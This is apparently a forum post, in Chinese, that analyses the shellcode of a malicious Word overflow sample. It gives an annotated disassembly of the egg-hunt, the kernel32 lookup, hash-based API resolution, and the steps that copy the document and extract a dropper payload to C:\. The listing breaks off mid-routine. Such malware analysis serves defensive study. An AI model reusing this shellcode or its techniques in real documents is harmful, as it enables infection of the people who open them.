
# [原创]一个word溢出样本ShellCode的分析

偶是新手，这个ShellCode也没有什么新意，如果说有的话，就在API的查找上还算有点优点。

```
00125B88    33DB            xor     ebx, ebx
00125B8A    81C6 00000200   add     esi, 20000
00125B90    46              inc     esi
00125B91    8B06            mov     eax, dword ptr [esi]
00125B93    3D 909064A1     cmp     eax, A1649090                    ;查找代码首位置
00125B98  ^ 75 F6           jnz     short 00125B90
00125B9A    43              inc     ebx
00125B9B    83FB 02         cmp     ebx, 2
00125B9E  ^ 75 F0           jnz     short 00125B90
00125BA0    FFE6            jmp     esi
00B8893E    90              nop
00B8893F    90              nop
00B88940    64:A1 30000000  mov     eax, dword ptr fs:[30]         ;取得kernel32.dll的基地址
00B88946    8B40 0C         mov     eax, dword ptr [eax+C]
00B88949    8B70 1C         mov     esi, dword ptr [eax+1C]
00B8894C    AD              lods    dword ptr [esi]
00B8894D    8B70 08         mov     esi, dword ptr [eax+8]         ; 7C800000h
00B88950    E9 6A020000     jmp     00B88BBF
00B88955    58              pop     eax                            ;把数据起始位置放入eax中
00B88956    81EC 00020000   sub     esp, 200
00B8895C    8BFC            mov     edi, esp
00B8895E    8B18            mov     ebx, dword ptr [eax]            ;  000A2000h
00B88960    895F 04         mov     dword ptr [edi+4], ebx
00B88963    8977 08         mov     dword ptr [edi+8], esi          ; Kernel32.dll
00B88966    83C0 04         add     eax, 4
00B88969    8947 0C         mov     dword ptr [edi+C], eax          ; "c:\~$" unicode
00B8896C    83C0 0C         add     eax, 0C
00B8896F    8947 10         mov     dword ptr [edi+10], eax         ; "c:\~.exe"  unicode
00B88972    83C0 12         add     eax, 12
00B88975    8987 80000000   mov     dword ptr [edi+80], eax         ; "c:\~.exe"  ascii
;;;; 查找在堆栈中的文件名路径字符串
00B8897B    57              push    edi                          ;    保存edi
00B8897C    8BFC            mov     edi, esp
00B8897E    81F7 FFFF0000   xor     edi, 0FFFF
00B88984    4F              dec     edi
00B88985    4F              dec     edi
00B88986    4F              dec     edi
00B88987    4F              dec     edi
00B88988    813F 6F006300   cmp     dword ptr [edi], 63006F      ; "oc"  unicode
00B8898E  ^ 75 F7           jnz     short 00B88987
00B88990    4F              dec     edi
00B88991    4F              dec     edi
00B88992    4F              dec     edi
00B88993    4F              dec     edi
00B88994    813F 2E006400   cmp     dword ptr [edi], 64002E      ;  ".d"  unicode
00B8899A  ^ 75 EB           jnz     short 00B88987
00B8899C    68 C8000000     push    0C8
00B889A1    59              pop     ecx
00B889A2    8BF7            mov     esi, edi
00B889A4    4E              dec     esi
00B889A5    813E 3A005C00   cmp     dword ptr [esi], 5C003A      ; ":\" unicode
00B889AB    74 04           je      short 00B889B1
00B889AD  ^ E2 F5           loopd   short 00B889A4
00B889AF  ^ EB D6           jmp     short 00B88987
00B889B1    4E              dec     esi
00B889B2    4E              dec     esi                          ; 查找到完整的原doc文件名路径字符串  unicode型
00B889B3    5F              pop     edi                          ; 恢复edi数据
00B889B4    8977 14         mov     dword ptr [edi+14], esi      ; 将doc路径放入edi+14
00B889B7    FF77 08         push    dword ptr [edi+8]
00B889BA    68 EC97030C     push    0C0397EC
00B889BF    E8 A7010000     call    00B88B6B
00B889C4    8947 1C         mov     dword ptr [edi+1C], eax            ;GlobalAlloc
00B889C7    FF77 08         push    dword ptr [edi+8]
00B889CA    68 F622B97C     push    7CB922F6
00B889CF    E8 97010000     call    00B88B6B
00B889D4    8947 20         mov     dword ptr [edi+20], eax            ;GlobalFree
00B889D7    FF77 08         push    dword ptr [edi+8]
00B889DA    68 BB17007C     push    7C0017BB
00B889DF    E8 87010000     call    00B88B6B
00B889E4    8947 24         mov     dword ptr [edi+24], eax            ;CreateFileW
00B889E7    FF77 08         push    dword ptr [edi+8]
00B889EA    68 FB97FD0F     push    0FFD97FB
00B889EF    E8 77010000     call    00B88B6B
00B889F4    8947 28         mov     dword ptr [edi+28], eax            ;CloseHandle
00B889F7    FF77 08         push    dword ptr [edi+8]
00B889FA    68 1665FA10     push    10FA6516
00B889FF    E8 67010000     call    00B88B6B
00B88A04    8947 2C         mov     dword ptr [edi+2C], eax            ;ReadFile
00B88A07    FF77 08         push    dword ptr [edi+8]
00B88A0A    68 1F790AE8     push    E80A791F
00B88A0F    E8 57010000     call    00B88B6B
00B88A14    8947 30         mov     dword ptr [edi+30], eax            ;WriteFile
00B88A17    FF77 08         push    dword ptr [edi+8]
00B88A1A    68 3BB0FFC2     push    C2FFB03B
00B88A1F    E8 47010000     call    00B88B6B
00B88A24    8947 34         mov     dword ptr [edi+34], eax            ;DeleteFileW
00B88A27    FF77 08         push    dword ptr [edi+8]
00B88A2A    68 AC08DA76     push    76DA08AC
00B88A2F    E8 37010000     call    00B88B6B
00B88A34    8947 38         mov     dword ptr [edi+38], eax            ;SetFilePointer
00B88A37    FF77 08         push    dword ptr [edi+8]
00B88A3A    68 98FE8A0E     push    0E8AFE98
00B88A3F    E8 27010000     call    00B88B6B
00B88A44    8947 3C         mov     dword ptr [edi+3C], eax            ;WinExec
00B88A47    FF77 08         push    dword ptr [edi+8]
00B88A4A    68 7489EC99     push    99EC8974
00B88A4F    E8 17010000     call    00B88B6B
00B88A54    8947 40         mov     dword ptr [edi+40], eax            ;CopyFileW
00B88A57    FF77 08         push    dword ptr [edi+8]
00B88A5A    68 7ED8E273     push    73E2D87E
00B88A5F    E8 07010000     call    00B88B6B
00B88A64    8947 44         mov     dword ptr [edi+44], eax            ;ExitProcess
;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
00B88A67    FF77 10         push    dword ptr [edi+10]                 ;C:\~.exe    unicode
00B88A6A    FF57 34         call    dword ptr [edi+34]                 ;DeleteFileW
00B88A6D    FF77 0C         push    dword ptr [edi+C]                  ; c:\~$
00B88A70    FF57 34         call    dword ptr [edi+34]                 ;DeleteFileW
00B88A73    6A 00           push    0
00B88A75    FF77 0C         push    dword ptr [edi+C]
00B88A78    FF77 14         push    dword ptr [edi+14]                  ;原doc文件路径   ~$
00B88A7B    FF57 40         call    dword ptr [edi+40]                 ;CopyFileW    原文件拷贝一份到C盘根目录下
00B88A7E    6A 00           push    0
00B88A80    68 80000000     push    80
00B88A85    6A 03           push    3
00B88A87    6A 00           push    0
00B88A89    6A 00           push    0
00B88A8B    68 00000080     push    80000000
00B88A90    FF77 0C         push    dword ptr [edi+C]
00B88A93    FF57 24         call    dword ptr [edi+24]               ; kernel32.CreateFileW  打开c:\~$
00B88A96    8947 60         mov     dword ptr [edi+60], eax
00B88A99    6A 02           push    2
00B88A9B    6A 00           push    0
00B88A9D    6A FC           push    -4
00B88A9F    FF77 60         push    dword ptr [edi+60]
00B88AA2    FF57 38         call    dword ptr [edi+38]               SetFilePointer      ;位置29FA5h
00B88AA5    6A 00           push    0
00B88AA7    8D9F A0000000   lea     ebx, dword ptr [edi+A0]
00B88AAD    53              push    ebx
00B88AAE    6A 04           push    4                                ;读取4个字节  值为 18BA5
00B88AB0    8D5F 04         lea     ebx, dword ptr [edi+4]
00B88AB3    53              push    ebx
00B88AB4    FF77 60         push    dword ptr [edi+60]
00B88AB7    FF57 2C         call    dword ptr [edi+2C]               ReadFile   刚才打开的c:\~$
00B88ABA    FF77 04         push    dword ptr [edi+4]                ; size 18BA5
00B88ABD    6A 40           push    40
```
